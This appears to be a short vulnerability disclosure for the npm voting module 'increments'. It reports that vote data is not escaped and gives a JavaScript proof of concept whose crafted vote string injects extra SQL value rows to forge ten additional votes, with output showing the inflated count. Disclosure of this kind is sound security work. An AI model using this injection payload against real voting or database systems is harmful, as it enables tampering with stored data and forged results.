# Vulnerability

## Vulnerability Description

This module does not escape voting data allowing attacker to create fake votes.

## Steps To Reproduce:

- `npm install increments`
- run poc:

```javascript
const increments = require('increments');
increments.setup('mysql://root:@localhost:3306/test');
increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
increments.statistics('fruits', function(e, f) {
	console.log( f.projectedWinner );
	process.exit(0);
});
```

Output:
```
{ name: 'Oranges',
  id: 'oranges',
  color: undefined,
  count: 11,
